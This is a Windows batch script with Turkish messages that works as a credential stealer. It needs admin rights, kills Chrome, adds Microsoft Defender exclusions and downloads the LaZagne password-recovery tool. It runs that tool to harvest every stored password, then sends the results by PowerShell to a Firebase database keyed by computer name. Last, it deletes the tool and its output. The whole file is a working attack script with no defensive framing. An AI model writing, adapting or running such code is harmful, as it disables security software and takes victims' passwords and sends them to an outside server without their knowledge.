@echo off
:: Step 1: Yönetici kontrolü
net session >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [+] Bu scriptin calismasi icin yonetici izni gerekiyor!
    echo Lutfen scripti yonetici olarak calistirin.
    pause
    exit /b 1
)

:: Step 2: Log dosyasi olustur
set LOGFILE=%TEMP%\browser_steal_log.txt
echo [%DATE% %TIME%] Script baslatildi >> "%LOGFILE%"
echo [+] Script baslatildi...

:: Step 3: Chrome'u kapat
echo [%DATE% %TIME%] Chrome kapatiliyor... >> "%LOGFILE%"
echo [+] Chrome kapatiliyor...
taskkill /F /IM chrome.exe >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [%DATE% %TIME%] UYARI: Chrome kapatilamadi, zaten calismiyor olabilir. >> "%LOGFILE%"
    echo [+] UYARI: Chrome kapatilamadi, devam ediliyor...
)

:: Step 4: Calisma dizinine gec
cd /d %TEMP%
if %ERRORLEVEL% neq 0 (
    echo [%DATE% %TIME%] HATA: TEMP dizinine gecilemedi! >> "%LOGFILE%"
    echo [+] HATA: TEMP dizinine gecilemedi!
    pause
    exit /b 1
)
echo [%DATE% %TIME%] Calisma dizini: %CD% >> "%LOGFILE%"
echo [+] Calisma dizini: %CD%

:: Step 5: Eski dosyalari sil veya mevcut dosyayi kontrol et
if exist lazagne.exe (
    echo [%DATE% %TIME%] Mevcut lazagne.exe bulundu, dosya kontrol ediliyor... >> "%LOGFILE%"
    echo [+] Mevcut lazagne.exe bulundu, dosya kontrol ediliyor...
    for %%F in (lazagne.exe) do (
        if %%~zF LSS 1000 (
            echo [%DATE% %TIME%] UYARI: lazagne.exe bozuk veya bos (%%~zF bayt), siliniyor... >> "%LOGFILE%"
            echo [+] UYARI: lazagne.exe bozuk, siliniyor...
            del /f /q lazagne.exe >nul 2>&1
        ) else (
            echo [%DATE% %TIME%] lazagne.exe gecerli, indirme atlanıyor... >> "%LOGFILE%"
            echo [+] lazagne.exe gecerli, indirme atlanıyor...
            goto :after_download
        )
    )
)
if exist results (
    echo [%DATE% %TIME%] Eski results klasoru siliniyor... >> "%LOGFILE%"
    echo [+] Eski results klasoru siliniyor...
    rd /s /q results >nul 2>&1
)

:: Step 6: Defender istisna ekle
echo [%DATE% %TIME%] Defender icin istisna ekleniyor... >> "%LOGFILE%"
echo [+] Defender icin istisna ekleniyor...
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%' -ExclusionProcess 'lazagne.exe' -ExclusionExtension 'exe'" >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [%DATE% %TIME%] UYARI: Defender istisna eklenemedi, devam ediliyor... >> "%LOGFILE%"
    echo [+] UYARI: Defender istisna eklenemedi, devam ediliyor...
)

:: Step 7: Lazagne indir
echo [%DATE% %TIME%] Lazagne indiriliyor... >> "%LOGFILE%"
echo [+] Lazagne indiriliyor...
curl -L -o lazagne.exe https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [%DATE% %TIME%] HATA: Curl indirme basarisiz, PowerShell ile deneniyor... >> "%LOGFILE%"
    echo [+] HATA: Curl indirme basarisiz, PowerShell ile deneniyor...
    powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe' -OutFile 'lazagne.exe' } catch { Write-Output ('HATA: PowerShell indirme basarisiz: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
    if %ERRORLEVEL% neq 0 (
        echo [%DATE% %TIME%] HATA: PowerShell indirme de basarisiz! >> "%LOGFILE%"
        echo [+] HATA: Dosya indirilemedi, lutfen internet baglantisini kontrol edin.
        pause
        exit /b 1
    )
)

:: Step 8: lazagne.exe dosyasini kontrol et
:after_download
if exist lazagne.exe (
    for %%F in (lazagne.exe) do (
        if %%~zF LSS 1000 (
            echo [%DATE% %TIME%] HATA: lazagne.exe bozuk veya bos (%%~zF bayt)! >> "%LOGFILE%"
            echo [+] HATA: lazagne.exe bozuk, lutfen tekrar deneyin.
            del /f /q lazagne.exe >nul 2>&1
            pause
            exit /b 1
        )
    )
    echo [%DATE% %TIME%] lazagne.exe basariyla indirildi veya bulundu. >> "%LOGFILE%"
    echo [+] lazagne.exe basariyla indirildi veya bulundu.
) else (
    echo [%DATE% %TIME%] HATA: lazagne.exe indirilemedi! >> "%LOGFILE%"
    echo [+] HATA: lazagne.exe indirilemedi, lutfen baglantiyi kontrol edin.
    pause
    exit /b 1
)

:: Step 9: Tum sifreleri topla (silent mode)
echo [%DATE% %TIME%] Tum sifreler toplanıyor... >> "%LOGFILE%"
echo [+] Tum sifreler toplanıyor...
lazagne.exe all -oN -output results >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [%DATE% %TIME%] HATA: lazagne.exe calistirilamadi! >> "%LOGFILE%"
    echo [+] HATA: Sifre toplama basarisiz, lutfen dosyayi kontrol edin.
    pause
    exit /b 1
)

:: Step 10: Firebase’e veri gonder
set DATA=
echo [%DATE% %TIME%] Results klasorundeki veriler isleniyor... >> "%LOGFILE%"
echo [+] Results klasorundeki veriler isleniyor...
setlocal EnableDelayedExpansion
for %%F in (results\*.txt) do (
    echo [%DATE% %TIME%] %%F isleniyor... >> "%LOGFILE%"
    echo [+] %%F isleniyor...
    for /f "usebackq delims=" %%A in ("%%F") do (
        set "line=%%A"
        set "line=!line:\=\\!"
        set "line=!line:"=\\\"!"
        set "line=!line:^|=\\|!"
        set "line=!line:^&=\\&!"
        set "line=!line:^^=\\^!"
        set "line=!line:
=\\n!"
        set "DATA=!DATA!!line!\\n"
    )
)
endlocal & set DATA=%DATA%
if not defined DATA (
    echo [%DATE% %TIME%] HATA: Hicbir veri dosyasi bulunamadi! >> "%LOGFILE%"
    echo [+] HATA: Hicbir veri dosyasi bulunamadi, NoDataCollected gonderiliyor...
    set DATA=NoDataCollected
)

:: Firebase URL with /credentials/%COMPUTERNAME%
set FB=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials/%COMPUTERNAME%.json
echo [%DATE% %TIME%] Firebase URL: %FB% >> "%LOGFILE%"
echo [+] Firebase URL: %FB%

echo [%DATE% %TIME%] Firebase’e veri gonderiliyor... >> "%LOGFILE%"
echo [+] Firebase’e veri gonderiliyor...
powershell -Command ^
  "try { $json = '{\"log\":\"%DATA%\"}'; Invoke-RestMethod -Uri '%FB%' -Method PATCH -Body $json -ContentType 'application/json' } catch { Write-Output ('HATA: Firebase gonderim basarisiz: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo [%DATE% %TIME%] HATA: Firebase gonderim basarisiz! >> "%LOGFILE%"
    echo [+] HATA: Firebase’e veri gonderilemedi, log dosyasini kontrol edin.
)

:: Step 11: Temizlik
:cleanup
echo [%DATE% %TIME%] Temizlik yapiliyor... >> "%LOGFILE%"
echo [+] Temizlik yapiliyor...
if exist lazagne.exe del /f /q lazagne.exe >nul 2>&1
if exist results rd /s /q results >nul 2>&1

echo [%DATE% %TIME%] Islem tamamlandi, cikiliyor... >> "%LOGFILE%"
echo [+] Islem tamamlandi, cikiliyor...
pause
exit /b 0
